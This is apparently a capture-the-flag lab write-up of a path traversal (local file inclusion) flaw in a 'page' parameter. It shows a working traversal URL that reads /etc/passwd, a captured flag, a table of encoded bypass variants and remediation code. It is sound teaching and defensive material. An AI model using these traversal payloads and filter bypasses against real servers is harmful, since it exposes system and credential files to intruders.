# Path Traversal — Arbitrary File Read via `page` Parameter

## Summary

This breach exploits a `page` parameter that is passed directly to a file-inclusion function with no sanitisation. By injecting `../` sequences into the parameter value, an attacker can escape the intended directory and read arbitrary files on the server — including sensitive system files such as `/etc/passwd`.

---

## Category

**Path Traversal / Local File Inclusion (LFI)**
OWASP: [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
CWE: [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

## Steps to Reproduce

### 1. Identify the vulnerable parameter

The application uses a `page` query parameter to load content:

```
http://10.11.10.2:80/index.php?page=upload
```

The server is likely resolving this to something like:

```php
include("pages/" . $_GET['page'] . ".php");
```

or reading the file directly:

```php
readfile("pages/" . $_GET['page']);
```

### 2. Craft the traversal payload

To escape the application's base directory and reach `/etc/passwd`, use enough `../` sequences to walk back to the filesystem root, then specify the target file:

```
http://10.11.10.2:80/index.php?page=upload/../../../../../../../etc/passwd
```

Each `../` moves one directory level up. Using more than needed is harmless — once the root (`/`) is reached, additional `../` sequences stay at root.

### 3. Flag

The server reads and returns `/etc/passwd` and the flag is present in the response:

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

---

## Why This Works

The application constructs a file path by directly concatenating user-supplied input with no validation. The `../` sequence is a standard filesystem operator meaning "go up one directory" — it is interpreted by the operating system itself, not the application, so no application-level trick is needed.

```
pages/upload/../../../../../../../etc/passwd
     ↑ intended base dir
             ↑↑↑ each ../ climbs one level
                                    ↑ target file
```

The OS resolves this path to `/etc/passwd` before the application ever sees it, handing the contents back as if it were a legitimate page file.

---

## Root Cause

| Problem | Detail |
|---|---|
| Unsanitised user input in file path | `$_GET['page']` is concatenated directly into a file path with no checks |
| No traversal sequence filtering | `../` and encoded variants (`%2e%2e%2f`, `..%2f`, etc.) are not stripped |
| No path canonicalisation | The resolved path is never verified to still be within the intended directory |
| Sensitive files readable by the web process | The web server process has read access to `/etc/passwd` and other system files |

---

## Remediation

### 1. Validate against an allowlist of known page names

The most robust fix — never accept a free-form path from the user. Accept only a predefined set of known values:

```php
$allowed = ["home", "about", "upload", "signin"];
$page = $_GET['page'] ?? "home";

if (!in_array($page, $allowed, true)) {
    http_response_code(400);
    die("Invalid page.");
}

include("pages/" . $page . ".php");
```

This eliminates traversal entirely — user input never touches the filesystem path.

### 2. Canonicalise and jail the resolved path

If free-form input is unavoidable, resolve the real path and assert it starts with the intended base directory:

```php
$base = realpath("pages/");
$requested = realpath("pages/" . $_GET['page']);

if ($requested === false || strpos($requested, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403);
    die("Access denied.");
}

include($requested);
```

`realpath()` resolves all `../` sequences and symlinks before the comparison is made.

```python
# Python equivalent
import os

BASE = os.path.realpath("pages/")
requested = os.path.realpath(os.path.join("pages/", user_input))

if not requested.startswith(BASE + os.sep):
    abort(403)
```

### 3. Strip traversal sequences (defence-in-depth only)

Stripping `../` is not a primary defence — encoding tricks (`%2e%2e/`, `..%2f`, double encoding) can bypass naive filters. Use it as an additional layer alongside canonicalisation, never as the sole check:

```php
$page = str_replace(["../", "..\\", "%2e%2e"], "", $_GET['page']);
```

### 4. Run the web server process with minimal privileges

The web server user should not have read access to sensitive system files. Apply filesystem permissions so the process can only read files within the web root:

```bash
# The web server process (e.g. www-data) should own only what it needs
chown -R www-data:www-data /var/www/html
chmod -R 750 /var/www/html

# Sensitive system files should never be readable by www-data
ls -l /etc/shadow   # should be root:shadow 640 — not readable by www-data
```

### 5. Consider a chroot jail or container isolation

Running the web server in a chroot or container means that even a successful traversal cannot reach real system files — the attacker's `/etc/passwd` is the container's isolated copy, not the host's.

---

## Variants to Be Aware Of

Path traversal can be obscured in several ways that naive filters miss:

| Encoding | Payload |
|---|---|
| URL encoding | `%2e%2e%2f` → `../` |
| Double URL encoding | `%252e%252e%252f` → `../` |
| Unicode / UTF-8 | `..%c0%af` → `../` (IIS) |
| Mixed slash | `..\` on Windows |
| Null byte (legacy PHP) | `../../etc/passwd%00.php` |

Always canonicalise with `realpath()` rather than trying to filter every variant.

---

## References

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP: Testing for Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [PortSwigger: Path Traversal](https://portswigger.net/web-security/file-path-traversal)
